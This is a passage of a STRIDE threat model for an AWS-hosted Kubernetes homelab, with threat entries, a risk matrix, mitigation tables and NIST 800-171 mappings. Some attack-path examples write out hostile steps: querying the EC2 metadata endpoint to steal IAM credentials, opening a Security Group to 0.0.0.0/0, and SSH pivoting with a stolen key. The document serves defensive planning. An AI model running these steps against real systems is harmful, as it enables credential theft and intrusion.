A targeted HTTP flood against expensive endpoints (GitLab repository API, Splunk search) saturates NGINX worker processes and makes all ingress-exposed services unavailable. Unlike network-layer floods, L7 floods are harder to filter because individual requests are syntactically valid.

*Threat actors:* TA-1 | *NIST:* SC-3.13.1, SI-3.14.2

---

### 6.10 Pod-to-Pod Network (East-West)

By default, Kubernetes implements a flat network model: any pod can reach any other pod on any port, in any namespace, cluster-wide. Without enforced `NetworkPolicy` objects, east-west traffic is completely unrestricted. VPC Security Groups protect EC2-to-EC2 traffic but do not intercept pod-level communication within a node.

---

#### I — Information Disclosure

**I-10.1 | HIGH — Unrestricted east-west pod communication**

A compromised pod in the `monitoring` namespace can connect to pods in other namespaces — including AWX, NetBox, or GitLab service endpoints — without any network-layer restriction. The only controls are RBAC (for Kubernetes API calls) and application-level authentication.

> *Attack path:* Attacker compromises Grafana pod via CVE → pod network probes `awx-service.awx.svc.cluster.local` → no NetworkPolicy blocks the connection → credential attack against AWX login succeeds → arbitrary Ansible execution against all EC2 nodes.

*Threat actors:* TA-5 | *NIST:* SC-3.13.1, AC-3.1.3

---

#### E — Elevation of Privilege

**E-10.1 | HIGH — CoreDNS poisoning redirects service discovery**

A compromised pod with write access to the CoreDNS ConfigMap can redirect service discovery lookups cluster-wide, enabling credential harvesting against fake service endpoints.

*Threat actors:* TA-5 | *NIST:* SC-3.13.8, SI-3.14.7

---

### 6.11 Kubernetes Secrets

Kubernetes Secrets are the native credential management mechanism. The absence of encryption at rest in etcd (the default) makes every Secret readable by anyone with direct etcd access.

---

#### I — Information Disclosure

**I-11.1 | CRITICAL — Secrets mounted as environment variables are widely leakable**

Secrets mounted as environment variables (`envFrom: secretRef`) are visible in pod descriptions, accessible via `/proc/<pid>/environ` after a container escape, and frequently captured by application startup logging.

*Threat actors:* TA-5 | *NIST:* SC-3.13.8, IA-3.5.4

---

**I-11.2 | HIGH — Application logging captures secret values**

Framework startup logging (Spring Boot Actuator, Flask debug mode) can capture secret values mounted as environment variables, which then appear in Splunk logs accessible to a broader set of principals.

*Threat actors:* TA-4, TA-5 | *NIST:* AU-3.3.1, SC-3.13.8

---

### 6.12 NetBox CMDB

NetBox 4.5.5 (netbox namespace) is the authoritative inventory source, integrated with AWX as a dynamic inventory provider via a custom Python script. NetBox is populated via API. Compromise affects not just documentation but live automation targeting.

---

#### T — Tampering

**T-12.1 | HIGH — CMDB inventory manipulation misdirects automation**

An attacker with NetBox API write access can modify device records to redirect AWX inventory — causing Ansible playbooks to target attacker-controlled hosts, skip legitimate nodes (allowing drift), or execute with incorrect variables (disabling security controls).

> *Attack path:* Attacker steals NetBox API token from AWX credential store → modifies `k8s-cp01` IP in NetBox inventory → AWX hardening playbook runs against attacker-controlled host instead of control plane → k8s-cp01 drifts from hardened baseline undetected.

*Threat actors:* TA-3, TA-5 | *NIST:* CM-3.4.1, CM-3.4.3, SI-3.14.7

---

#### I — Information Disclosure

**I-12.1 | MEDIUM — Inventory data exposes full infrastructure map**

NetBox contains the complete infrastructure inventory including internal IP addresses, hostnames, device roles, and network topology. An attacker with NetBox read access obtains a complete reconnaissance map of the private subnet without any active scanning.

*Threat actors:* TA-1, TA-5 | *NIST:* AC-3.1.1, SI-3.14.6

---

### 6.13 Monitoring Stack (Prometheus / Grafana)

The kube-prometheus-stack (Grafana port 3000) observes the entire cluster. Prometheus scrapes metrics from all nodes and pods; Grafana visualizes them with datasource connections to Splunk.

---

#### I — Information Disclosure

**I-13.1 | HIGH — Prometheus metrics exposing credentials or operational data**

Prometheus scrapes metrics endpoints that may expose sensitive operational data. Prometheus's web UI also exposes the complete scrape configuration — including `basic_auth` credentials in `scrape_configs` — to any user who can reach the endpoint.

*Threat actors:* TA-1, TA-5 | *NIST:* SC-3.13.8, AC-3.1.1

---

**I-13.2 | MEDIUM — Grafana datasource credentials readable via API**

Grafana stores datasource connection strings (Splunk, Prometheus) in its internal database. Any user with `Editor` or `Admin` Grafana role can retrieve full datasource configurations including credentials via the Grafana HTTP API.

*Threat actors:* TA-1, TA-5 | *NIST:* SC-3.13.8, IA-3.5.4

---

### 6.14 Node OS (Rocky Linux 9.7)

Rocky Linux 9.7 (LVM variant, RHEL-binary-compatible) is the node OS across all five EC2 instances. It is the trust foundation for all workloads — and the layer directly beneath the AWS IMDS.

---

#### T — Tampering

**T-14.1 | HIGH — Unpatched kernel CVE enabling container escape**

A privilege escalation CVE targeting namespace boundaries, `ptrace`, or `io_uring` can break container isolation and grant root on the host OS. On EC2, root node access additionally enables IMDS credential theft. Rocky Linux 9's security update cadence and `dnf-automatic` patch scheduling must be maintained.

*Threat actors:* TA-2, TA-5 | *NIST:* SI-3.14.1, CM-3.4.4

---

**T-14.2 | HIGH — AIDE baseline bypass via database manipulation**

AIDE monitors the filesystem for unauthorized changes. An attacker with root node access can update the AIDE database to include their malicious files as "authorized," silencing subsequent FIM checks. AIDE databases must be stored read-only and compared against a remote copy to detect this.

*Threat actors:* TA-3, TA-5 | *NIST:* SI-3.14.7, CM-3.4.1

---

**T-14.3 | MEDIUM — Falco rule bypass via driver misconfiguration**

Falco 0.43.0 runs with the legacy eBPF driver (required on Rocky 9 due to a `modern_ebpf` container plugin duplicate bug). If Falco rules are not kept current with attacker TTPs, or if the DaemonSet pod is disrupted (OOMKilled on constrained nodes), runtime behavioral detection is silenced.

*Threat actors:* TA-3, TA-5 | *NIST:* SI-3.14.7, AU-3.3.1

---

### 6.15 AWS Infrastructure Layer

The AWS layer is entirely new relative to TM-K8S-001. It encompasses EC2, VPC, Security Groups, IAM roles, EBS volumes, S3 (if used for backups), CloudWatch, and the AWS metadata service (IMDS). Compromise at this layer operates outside the Kubernetes control plane and may be undetectable by cluster-level monitoring.

---

#### S — Spoofing

**S-15.1 | CRITICAL — AWS IAM credential compromise**

If AWS access keys (from an IAM user, EC2 instance role, or assumed role) are exposed — through environment variables, plaintext files, or IMDS abuse — an attacker gains control plane access to the entire AWS account, including the ability to terminate EC2 instances, modify Security Groups, delete EBS volumes, or create new instances.

> *Attack path:* Attacker achieves container escape on any EC2 node → queries `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → retrieves temporary IAM role credentials → calls EC2 API to open new Security Group inbound rules → cluster private subnet is now internet-accessible.

*Threat actors:* TA-5, TA-6 | *NIST:* AC-3.1.1, IA-3.5.1, SC-3.13.8

---

#### T — Tampering

**T-15.1 | HIGH — Security Group modification expands attack surface**

AWS Security Groups define the network perimeter for all EC2 instances. An attacker with EC2 `AuthorizeSecurityGroupIngress` permissions can open arbitrary ports to the internet, exposing the kube-apiserver, etcd, internal services, or SSH directly without any Kubernetes-layer visibility.

> *Attack path:* Attacker obtains IAM credentials with `ec2:*` permissions → `aws ec2 authorize-security-group-ingress --port 6443 --cidr 0.0.0.0/0` → kube-apiserver exposed to internet → external brute force of API server authentication.

*Threat actors:* TA-3, TA-6 | *NIST:* SC-3.13.1, CM-3.4.3

---

**T-15.2 | HIGH — EC2 instance metadata (IMDS) credential theft**

The IMDSv1 endpoint at `169.254.169.254` is reachable by default from any process on the EC2 instance, including containers. A container without network egress restrictions can query IMDS and retrieve the instance's IAM role credentials, using them for AWS API calls outside of Kubernetes RBAC entirely.

> *Mitigation:* Enforce IMDSv2 (PUT token required) on all instances via instance metadata options; block `169.254.169.254` egress in pod-level iptables rules via NetworkPolicy or Falco detection.

*Threat actors:* TA-5 | *NIST:* SC-3.13.8, AC-3.1.1, IA-3.5.1

---

**T-15.3 | MEDIUM — Terraform state file exposure**

Terraform state (`.tfstate`) may contain sensitive data including AWS account IDs, resource ARNs, EC2 instance details, and security group configurations. If stored unencrypted in a local file or an accessible S3 bucket without versioning, it provides a reconnaissance map equivalent to full infrastructure documentation.

*Threat actors:* TA-3, TA-4 | *NIST:* SC-3.13.8, CM-3.4.1

---

#### I — Information Disclosure

**I-15.1 | HIGH — CloudTrail gaps allow undetected cloud control plane actions**

If CloudTrail is not enabled for all regions, cloud control plane operations (Security Group modifications, instance stops, EBS snapshot creation) are not logged. An attacker operating via compromised IAM credentials cannot be detected or reconstructed forensically without CloudTrail.

*Threat actors:* TA-3, TA-6 | *NIST:* AU-3.3.1, SI-3.14.7

---

#### D — Denial of Service

**D-15.1 | HIGH — EC2 instance termination / stop**

An attacker with `ec2:TerminateInstances` or `ec2:StopInstances` permissions can terminate any cluster node. Terminating k8s-cp01 brings down the entire Kubernetes control plane until the instance is rebuilt from AMI or snapshot, with potential etcd data loss.

*Threat actors:* TA-3, TA-6 | *NIST:* SC-3.13.1

---

### 6.16 Bastion Host

The bastion (t3.medium, public subnet) is the sole administrative ingress point for SSH access to all private-subnet nodes. Its compromise is equivalent to compromise of all private nodes from a network access standpoint.

---

#### S — Spoofing

**S-16.1 | CRITICAL — Bastion SSH key compromise grants access to all private nodes**

The bastion's SSH private key is the master credential for all administrative access. An attacker who obtains this key can SSH directly to all five private-subnet nodes without authentication challenges from within the VPC.

> *Attack path:* Attacker phishes admin → extracts SSH private key from admin workstation → `ssh -i stolen.key ec2-user@bastion-public-ip` → `ssh ipa01`, `ssh k8s-cp01`, etc. → full infrastructure access.

*Threat actors:* TA-1, TA-3 | *NIST:* IA-3.5.1, AC-3.1.1, SC-3.13.8

---

#### T — Tampering

**T-16.1 | HIGH — Bastion as pivot point for private subnet lateral movement**

A compromised bastion becomes the attacker's persistent foothold in the VPC. All private subnet nodes trust the bastion's source IP in their Security Group rules. From the bastion, an attacker can attack any internal service, scan the private subnet, and probe node APIs that are not internet-exposed.

*Threat actors:* TA-1, TA-3 | *NIST:* SC-3.13.1, AC-3.1.3

---

#### D — Denial of Service

**D-16.1 | MEDIUM — Bastion outage eliminates administrative access**

If the bastion instance is stopped, terminated, or unreachable (Security Group misconfiguration, network ACL issue), all SSH-based administrative access to private-subnet nodes is severed. Recovery requires AWS console access (EC2 instance connect, SSM Session Manager, or direct console attachment).

*Threat actors:* TA-1, TA-6 | *NIST:* SC-3.13.1

---

## 7. Cross-Cutting Threats

These threats span multiple components and trust boundaries and cannot be addressed by hardening a single component.

---

**XC-1 | HIGH — Credential reuse across services**

The cluster's service stack may share common administrative credentials (a single "lab password" reused across Grafana, AWX, GitLab admin accounts). A single compromised credential enables lateral movement to all systems that share it. Per-service, per-user credentials managed through FreeIPA are the required control.

*NIST:* IA-3.5.7, IA-3.5.4

---

**XC-2 | HIGH — Stale ServiceAccount tokens**

ServiceAccount tokens created as `kubernetes.io/service-account-token` Secrets are non-expiring by default. Decommissioned services, completed pipeline jobs, and orphaned namespaces may leave active tokens in CI/CD variables or configuration files providing persistent access with no expiry.

*NIST:* IA-3.5.4, AC-3.1.2

---

**XC-3 | HIGH — Insufficient audit log coverage**

The default Kubernetes audit policy logs at `Metadata` level — capturing who did what, but not the content of requests or responses. For Secrets, `RequestResponse` level logging is required. Without it, mass secret exfiltration generates only `get secrets` events with no indication of what values were returned.

*NIST:* AU-3.3.1, SI-3.14.6

---

**XC-4 | MEDIUM — Backup security gaps**

etcd snapshots and other backup artifacts are complete copies of sensitive data. Backups stored without encryption, integrity checksums, or access controls (e.g., an unencrypted S3 bucket) represent the same risk as a live data breach with a longer exposure window and no runtime detection.

*NIST:* MP-3.8.3, SC-3.13.8

---

**XC-5 | MEDIUM — Clock synchronization as Kerberos dependency**

FreeIPA's Kerberos implementation requires all participants to have clocks synchronized within 5 minutes. Clock drift on any EC2 node — caused by NTP misconfiguration or VM clock skew — causes Kerberos authentication failures across all OIDC-integrated services simultaneously.

*NIST:* AU-3.3.1, SC-3.13.8

---

**XC-6 | HIGH — AWS credential exposure in Terraform / Ansible artifacts**

Terraform state files, Ansible vault files, and Ansible inventory scripts may inadvertently contain AWS credentials, EC2 hostnames, or API tokens. If these artifacts are committed to GitLab or GitHub (including github.com/jslocomb/homelab-k8s), they are permanently accessible via git history even after removal from HEAD.

*NIST:* SC-3.13.8, CM-3.4.1, IA-3.5.7

---

## 8. Threat Summary Matrix

| ID | Component | STRIDE | Threat | Likelihood | Impact | Risk |
|---|---|---|---|---|---|---|
| S-15.1 | AWS IAM | S | IAM credential compromise → account control | MED | CRIT | **CRITICAL** |
| S-1.1 | kube-apiserver | S | Stolen kubeconfig impersonation | MED | CRIT | **CRITICAL** |
| S-16.1 | Bastion | S | Bastion SSH key compromise | MED | CRIT | **CRITICAL** |
| T-2.1 | etcd | T | Direct etcd write bypassing RBAC | LOW | CRIT | **CRITICAL** |
| I-2.1 | etcd | I | Secrets at rest not encrypted | HIGH | CRIT | **CRITICAL** |
| I-1.1 | kube-apiserver | I | Secret enumeration via list/get | HIGH | CRIT | **CRITICAL** |
| E-1.1 | kube-apiserver | E | Privileged pod container escape | MED | CRIT | **CRITICAL** |
| T-1.1 | kube-apiserver | T | Malicious admission webhook injection | LOW | CRIT | **CRITICAL** |
| T-5.1 | GitLab CI | T | Pipeline deploys malicious workloads | MED | CRIT | **CRITICAL** |
| S-4.1 | FreeIPA | S | FreeIPA admin credential compromise | LOW | CRIT | **CRITICAL** |
| E-6.1 | AWX | E | Arbitrary playbook execution via var injection | MED | CRIT | **CRITICAL** |
| T-7.1 | Splunk | T | Audit log deletion by compromised admin | LOW | CRIT | **CRITICAL** |
| E-3.1 | kubelet | E | Container escape to node OS | MED | CRIT | **CRITICAL** |
| T-15.2 | AWS IMDS | T | IMDS credential theft post-container-escape | MED | CRIT | **CRITICAL** |
| T-15.1 | AWS SG | T | Security Group modification expands perimeter | LOW | CRIT | **HIGH** |
| T-16.1 | Bastion | T | Bastion as persistent VPC pivot point | MED | HIGH | **HIGH** |
| D-15.1 | AWS EC2 | D | EC2 instance termination | LOW | CRIT | **HIGH** |
| S-1.2 | kube-apiserver | S | ServiceAccount token theft | HIGH | HIGH | **HIGH** |
| T-1.2 | kube-apiserver | T | RBAC policy privilege escalation | MED | CRIT | **HIGH** |
| S-4.2 | FreeIPA | S | Kerberos golden ticket | LOW | CRIT | **HIGH** |
| D-4.1 | FreeIPA | D | FreeIPA outage cascades auth | MED | HIGH | **HIGH** |
| S-5.1 | GitLab CI | S | CI/CD variable exfiltration | HIGH | HIGH | **HIGH** |
| T-5.2 | GitLab CI | T | Supply chain poisoning | MED | HIGH | **HIGH** |
| S-6.1 | AWX | S | AWX credential store exfiltration | MED | CRIT | **HIGH** |
| T-7.2 | Splunk | T | HEC log injection / poisoning | MED | HIGH | **HIGH** |
| T-8.1 | Registry | T | Mutable tag overwrite | MED | HIGH | **HIGH** |
| T-12.1 | NetBox | T | CMDB inventory manipulation | MED | HIGH | **HIGH** |
| I-10.1 | Pod network | I | Unrestricted east-west traffic | HIGH | HIGH | **HIGH** |
| I-11.1 | Secrets | I | Env var secret leakage | HIGH | HIGH | **HIGH** |
| I-15.1 | CloudTrail | I | Cloud control plane gaps | MED | HIGH | **HIGH** |
| XC-2 | Cross-cutting | - | Stale SA tokens | HIGH | HIGH | **HIGH** |
| XC-3 | Cross-cutting | - | Insufficient audit coverage | HIGH | HIGH | **HIGH** |
| XC-6 | Cross-cutting | - | AWS credentials in IaC artifacts | MED | HIGH | **HIGH** |
| R-1.1 | kube-apiserver | R | Shared kubeconfig no attribution | HIGH | MED | **MEDIUM** |
| T-4.1 | FreeIPA | T | LDAP group membership manipulation | LOW | HIGH | **MEDIUM** |
| T-14.2 | Node OS | T | AIDE baseline bypass | LOW | HIGH | **MEDIUM** |
| T-14.3 | Node OS | T | Falco rule bypass / DaemonSet disruption | LOW | HIGH | **MEDIUM** |
| T-15.3 | Terraform | T | Terraform state file exposure | MED | MED | **MEDIUM** |
| I-12.1 | NetBox | I | Inventory exposes full infrastructure map | MED | MED | **MEDIUM** |
| I-13.1 | Prometheus | I | Metrics or scrape credential exposure | MED | MED | **MEDIUM** |
| S-6.2 | NetBox/AWX | S | NetBox inventory poisoning | LOW | HIGH | **MEDIUM** |
| D-16.1 | Bastion | D | Bastion outage eliminates admin access | LOW | HIGH | **MEDIUM** |
| XC-4 | Cross-cutting | - | Backup security gaps | MED | MED | **MEDIUM** |
| XC-5 | Cross-cutting | - | Clock synchronization failure | LOW | HIGH | **MEDIUM** |

*Likelihood: HIGH = actively exploitable with common tools; MED = requires targeted effort; LOW = requires significant skill or specific access conditions*

---

## 9. Mitigations and Controls

### 9.1 Kubernetes API Server Hardening

| Control | Implementation | Priority |
|---|---|---|
| Encrypt secrets at rest | `--encryption-provider-config` with `secretbox` algorithm on kube-apiserver | **P1** |
| Enable `RequestResponse` audit logging for secrets | `/etc/kubernetes/audit-policy.yaml` — `level: RequestResponse` for `secrets` resource | **P1** |
| Verify anonymous auth disabled | `--anonymous-auth=false` (RKE2 default; confirm via `curl -sk https://apiserver:6443/api`) | **P1** |
| Enable NodeRestriction admission | `--enable-admission-plugins=NodeRestriction,...` (RKE2 default; verify active) | **P1** |
| Audit RBAC bindings weekly | Script to diff ClusterRoleBindings vs approved baseline; alert in Splunk on changes | **P1** |
| Disable profiling endpoint | `--profiling=false` | P2 |
| Rotate all cluster certificates annually | Monitor cert expiry via Prometheus alertmanager; document rotation runbook | P2 |

### 9.2 etcd Protection

| Control | Implementation | Priority |
|---|---|---|
| Restrict etcd to loopback and control-plane IP only | `--listen-client-urls=https://127.0.0.1:2379,https://<cp-ip>:2379` | **P1** |
| Enforce mTLS on all etcd connections | Dedicated etcd CA separate from Kubernetes CA (RKE2 default; verify) | **P1** |
| Encrypt etcd snapshots before storing | GPG-encrypt snapshots before writing to backup storage (S3 with SSE or local) | **P1** |
| Monitor etcd disk usage | Prometheus alert at 70% and 85% disk utilization on `/var/lib/etcd` EBS volume | P2 |
| Restrict S3 backup bucket access | Bucket policy: allow only k8s-cp01 instance role; block public access; enable versioning | P2 |

### 9.3 RBAC Least Privilege

| Control | Implementation | Priority |
|---|---|---|
| Audit all `cluster-admin` ClusterRoleBindings | `kubectl get clusterrolebindings` weekly; Splunk alert on any new binding | **P1** |
| Prefer namespace-scoped Roles over ClusterRoles | Review all CRBs; downscope to namespaced Roles where cluster-wide access is unnecessary | **P1** |
| Remove `list` on secrets from workload service accounts | No workload SA should have `list secrets`; enforce via OPA/Gatekeeper | **P1** |
| Use short-lived projected ServiceAccount tokens | `serviceAccountToken` projection with `expirationSeconds: 3600` on all pods | **P1** |

### 9.4 Pod Security

| Control | Implementation | Priority |
|---|---|---|
| Enable PodSecurity `restricted` profile | Label all namespaces: `pod-security.kubernetes.io/enforce: restricted` | **P1** |
| Block host namespace sharing | PSA restricted profile + OPA policy; alert on `hostPID/hostNetwork/hostIPC: true` | **P1** |
| Block privileged containers | PSA restricted profile; verify RKE2 CIS baseline enforces this | **P1** |
| Require non-root user context | `runAsNonRoot: true` and `runAsUser: >1000` in all SecurityContexts | **P1** |
| Drop all Linux capabilities | `capabilities: drop: [ALL]` in all container SecurityContexts | P2 |
| Block IMDS access from pods | iptables rule on each node blocking pod-originating traffic to 169.254.169.254 | **P1** |

### 9.5 Network Policy

| Control | Implementation | Priority |
|---|---|---|
| Default-deny all ingress and egress per namespace | Apply `NetworkPolicy` with empty `podSelector: {}` to every namespace | **P1** |
| Explicitly allowlist required service paths | Per-namespace allowlist policies; document all allowed paths in NetBox | **P1** |
| Isolate `kube-system` from workload namespaces | NetworkPolicy blocks workload pods from reaching etcd ClusterIP and kubelet ports | **P1** |
| Restrict pod egress to known VPC CIDRs | Block `0.0.0.0/0` egress; allowlist VPC CIDR and DNS only (prevents IMDS and internet egress) | **P1** |

### 9.6 Secret Management

| Control | Implementation | Priority |
|---|---|---|
| Implement Sealed Secrets or Vault for all secrets | Zero plaintext secrets in Git; all secrets managed via sealed-secrets or Vault | **P1** |
| Mount secrets as volumes, not environment variables | Volume mounts with `defaultMode: 0400`; audit all Deployments for `envFrom: secretRef` | **P1** |
| Rotate secrets on any suspected compromise | Document rotation procedures for each secret type; test runbooks quarterly | **P1** |
| Run daily secret access audit | `k8s_secret_auditor.py` on nightly audit log export; Splunk alert on `BURST_ACCESS` | **P1** |

### 9.7 CI/CD Security

| Control | Implementation | Priority |
|---|---|---|
| Protect `main` branch; require MR reviews | GitLab branch protection; minimum 1 required approver before merge | **P1** |
| Scope CI ServiceAccounts to minimum required permissions | Separate namespace-scoped SA per application; no cluster-admin for CI | **P1** |
| Pin image digests in pipelines | Use `image@sha256:...` in all `.gitlab-ci.yml`; tag references are mutable | **P1** |
| Scan images in pipeline with Trivy | Add `trivy image` stage before any deploy step; block on CRITICAL severity CVEs | **P1** |
| Disable "Ask at launch" on all production AWX templates | Prevent extra_vars injection in job templates with privileged credentials | **P1** |
| Restrict NetBox API token scope | Issue read-only token for AWX inventory; separate write token for admin use | P2 |

### 9.8 AWS Infrastructure

| Control | Implementation | Priority |
|---|---|---|
| Enforce IMDSv2 on all EC2 instances | `aws ec2 modify-instance-metadata-options --http-tokens required` on all 5 instances | **P1** |
| Enable AWS CloudTrail for all regions | Multi-region CloudTrail with S3 delivery; ship to Splunk via HEC for correlation | **P1** |
| Use IAM least-privilege instance roles | EC2 instance roles scoped to minimum required S3/CloudWatch permissions; no `*` actions | **P1** |
| Enable MFA delete on backup S3 buckets | Require MFA for object deletion on etcd snapshot and log archive buckets | **P1** |
| Restrict Security Group rules via Terraform | All SG rules managed via Terraform; manual console changes trigger Splunk alert via CloudTrail | **P1** |
| Encrypt Terraform state at rest | Remote state in S3 with SSE-KMS and versioning; restrict access via bucket policy | **P1** |
| Restrict bastion Security Group to known admin IPs | Port 22 inbound restricted to admin static IP(s); never `0.0.0.0/0` | **P1** |
| Enable AWS Config for resource change tracking | Alert on Security Group ingress rule creation targeting `0.0.0.0/0` | P2 |
| Enable VPC Flow Logs | Send to S3 or CloudWatch; ship to Splunk for east-west traffic correlation | P2 |

### 9.9 Bastion Security

| Control | Implementation | Priority |
|---|---|---|
| Use SSH certificates instead of static authorized_keys | Short-lived SSH certificates via FreeIPA SSSD; no permanent authorized_keys | P2 |
| Enable bastion session logging | All SSH sessions logged to Splunk; alert on sessions outside business hours | **P1** |
| Restrict bastion-to-node traffic via Security Groups | Bastion SG allows port 22 outbound to private SG only; nodes allow port 22 only from bastion SG | **P1** |
| Monitor bastion SSH access patterns | Splunk alert on failed login attempts, geographic anomalies, off-hours access | **P1** |

### 9.10 FreeIPA / Identity

| Control | Implementation | Priority |
|---|---|---|
| Enforce MFA for all human admin accounts | FreeIPA OTP (TOTP) mandatory for members of the `admins` group | **P1** |
| Disable anonymous LDAP bind | `ldapmodify`: set `nsslapd-allow-anonymous-access: rootdse` | **P1** |
| Run daily account lifecycle audit | `freeipa_account_auditor.py` nightly; Splunk alert on stale admin accounts | **P1** |
| Restrict `krbtgt` knowledge | IPA admin password in offline password manager; rotate annually | P2 |
| Deploy FreeIPA replica for HA | `ipa-replica-install` on a second EC2 instance (ipa02) to eliminate auth SPOF | P3 |

### 9.11 Logging and Audit

| Control | Implementation | Priority |
|---|---|---|
| Ship all audit logs to Splunk in real time | Splunk Universal Forwarders ingesting audit, secure, syslog, and AIDE logs on all 5 nodes | **P1** |
| Ship CloudTrail to Splunk | HEC ingestion of CloudTrail events; correlate with k8s audit events | **P1** |
| Set minimum 90-day log retention | Splunk index retention policy; AWS CloudTrail S3 lifecycle 90-day minimum | **P1** |
| Alert on audit log source gaps | Splunk monitor alert if any UF source is absent for more than 15 minutes | **P1** |
| Run AIDE daily on all nodes | Cron 02:00 UTC: `aide --check 2>&1 | python3 /usr/local/bin/aide_to_splunk.py --report -` | **P1** |

### 9.12 Runtime Security (Falco)

| Control | Implementation | Priority |
|---|---|---|
| Maintain Falco DaemonSet operational | Monitor Falco pod health via kube-prometheus-stack; alert on DaemonSet pod restarts | **P1** |
| Alert on Falco `modern_ebpf` driver issues | Do not switch to `modern_ebpf` on Rocky 9 (known container plugin duplicate bug); use legacy eBPF | **P1** |
| Tune Falco rules for lab TTPs | Add rules for: IMDS queries from containers, AIDE database writes, unexpected kubectl exec | **P1** |
| Forward Falco alerts to Splunk | Falco JSON output → Splunk HEC; create Splunk saved search for CRITICAL Falco events | **P1** |

---

## 10. NIST 800-171 Control Mapping

| Threat IDs | NIST Control | Control Description | Implementation |
|---|---|---|---|
| S-1.1, S-1.2, S-2.1, S-4.1, S-15.1, S-16.1 | **IA-3.5.1** | Identify information system users and authenticate before allowing access | Unique identifiers; prohibit shared credentials; mTLS everywhere; MFA on bastion |
| T-1.2, E-1.1, E-6.1, I-1.1 | **AC-3.1.1** | Limit system access to authorized users and legitimate transactions | RBAC least privilege; deny privileged containers; restrict secret access |
| I-10.1, T-15.1, T-16.1 | **AC-3.1.3** | Control the flow of CUI per approved authorizations | NetworkPolicy enforcement; Security Group controls; namespace isolation |
| I-2.1, T-2.2, T-15.2, I-11.1 | **SC-3.13.8** | Implement cryptographic mechanisms to prevent unauthorized CUI disclosure | Encrypt secrets at rest; TLS on all transports; IMDSv2; GPG-encrypted backups |
| T-1.1, T-1.2, T-15.1, T-12.1 | **CM-3.4.3** | Track, review, approve, and log changes to organizational systems | RBAC auditing; Security Group changes via Terraform; AWS Config alerts |
| R-1.1, XC-3, I-15.1 | **AU-3.3.1** | Create and retain system audit records to enable monitoring and analysis | RequestResponse audit logging; CloudTrail; Splunk 90-day retention |
| T-7.1, T-14.2, T-14.3, S-15.1 | **SI-3.14.7** | Identify unauthorized use of organizational systems | Falco runtime detection; AIDE FIM; Splunk correlation rules; CloudTrail alerting |
| D-1.1, D-4.1, D-15.1, D-16.1 | **SC-3.13.1** | Monitor, control, and protect CUI communications at external boundaries | Security Group least privilege; bastion restriction; VPC Flow Logs; rate limiting |
| T-5.2, T-8.1, XC-6 | **SA-3.12.1** | Monitor and protect the integrity of security-relevant software | Trivy image scanning; signed images; Terraform state in encrypted S3 |
| XC-2, S-1.2, S-1.3 | **IA-3.5.2** | Authenticate identities of users, processes, or devices before access | Projected SA tokens with expiry; certificate lifecycle management; IMDSv2 |
| I-1.2, I-12.1 | **SI-3.14.6** | Monitor systems including inbound/outbound communications for attacks | Prometheus restrictions; kube-apiserver discovery endpoint controls |
| T-14.1 | **CM-3.4.4** | Analyze security impact of changes before implementation | `dnf-automatic` patching; kernel CVE tracking; staged rollout for updates |
| T-2.2, XC-4 | **MP-3.8.3** | Sanitize or destroy CUI before disposal or reuse | Encrypted backups; S3 MFA delete; access-controlled snapshot storage |
| T-15.3, XC-6 | **CM-3.4.5** | Define, document, approve, and enforce access restrictions for configuration changes | PR review requirements; Terraform for all infrastructure changes; no manual SG edits |
| S-4.1, S-4.2, XC-1 | **IA-3.5.7** | Enforce minimum password complexity and change requirements | FreeIPA password policy; MFA for admins; per-service credentials; no credential reuse |
| XC-2, S-1.2 | **AC-3.1.2** | Limit system access to types of transactions authorized users may execute | SA scope restrictions; HBAC rules in FreeIPA; IAM least-privilege instance roles |

---

## 11. Residual Risk Register

After implementing all P1 controls defined in Section 9, the following risks remain and are formally accepted as part of the lab design:

| Risk ID | Description | Residual Likelihood | Residual Impact | Accepted? | Rationale |
|---|---|---|---|---|---|
| RR-01 | Single-node control plane — etcd SPOF | LOW | HIGH | **Yes** | Lab constraint; etcd backup to encrypted S3; recovery procedure documented |
| RR-02 | Single FreeIPA instance — auth SPOF | LOW | HIGH | **Yes** | Replica deferred (P3); local fallback auth for emergency node access |
| RR-03 | No hardware security module for etcd or FreeIPA CA | LOW | HIGH | **Yes** | Lab environment; CA key protected by filesystem permissions + AIDE monitoring |
| RR-04 | Container images pulled from public registries at build time | MED | MED | **Yes** | Trivy scanning in pipeline provides compensating control; full private mirror deferred |
| RR-05 | No pod-to-pod mutual TLS (service mesh) | MED | MED | **Conditional** | NetworkPolicy provides network-layer isolation; Istio/Linkerd mTLS is future scope |
| RR-06 | No dedicated AWS WAF in front of ingress | MED | MED | **Yes** | Security Groups provide basic perimeter; WAF cost not justified for lab scale |
| RR-07 | Terraform state in local or basic S3 without Terraform Cloud | LOW | MED | **Yes** | S3 versioning and SSE-KMS provide adequate protection for lab context |
| RR-08 | VPC Flow Logs not shipped to Splunk | MED | MED | **Conditional** | CloudTrail covers control plane actions; Flow Logs are a P2 enhancement |
| RR-09 | GitHub public mirror (github.com/jslocomb/homelab-k8s) | LOW | LOW | **Yes** | No secrets or credentials committed; secrets scanning via GitHub Advanced Security |
| RR-10 | Falco `modern_ebpf` driver unavailable on Rocky 9 | LOW | MED | **Yes** | Legacy eBPF driver provides equivalent kernel-level visibility for this environment |

---

## 12. AWS-Specific Control Gaps vs. GovCloud IL2/IL4

This section documents the delta between the current AWS commercial deployment and a production AWS GovCloud IL2 or IL4 environment, supporting transferability narrative for DoD contractor interviews.

| Control Area | Current (AWS Commercial) | GovCloud IL2 Requirement | GovCloud IL4 Requirement | Gap |
|---|---|---|---|---|
| Data sovereignty | us-west-2 (commercial) | AWS GovCloud (US-West/East) | AWS GovCloud (US) | Region migration required |
| FedRAMP authorization | Not required (lab) | FedRAMP Moderate baseline | FedRAMP High baseline | Requires GovCloud account |
| IAM credential rotation | Manual | Automated; SCPs enforced | Automated; SCPs enforced | AWS Organizations SCP layer |
| MFA enforcement | Manual per-user | SCP: `aws:MultiFactorAuthPresent` | SCP: `aws:MultiFactorAuthPresent` | Service Control Policy |
| CloudTrail | Recommended | Required; immutable log | Required; immutable log; FIPS 140-2 | Enforce via AWS Config |
| Encryption in transit | TLS 1.2+ (best effort) | TLS 1.2+ required | FIPS 140-2 TLS required | FIPS endpoint configuration |
| VPC Flow Logs | Optional (P2) | Required | Required | Enable and ship to SIEM |
| CMEK (Customer-managed keys) | Not implemented | Required for PII/CUI S3 | Required | AWS KMS CMK for all buckets |
| Security Hub / GuardDuty | Not enabled | Strongly recommended | Required | Enable and integrate with Splunk |
| EC2 Image Builder | Not used | Hardened AMI required | STIG-hardened AMI required | Rocky Linux → RHEL STIG AMI |
| Penetration testing | Not performed | Required annually | Required semi-annually | Scheduled assessment |

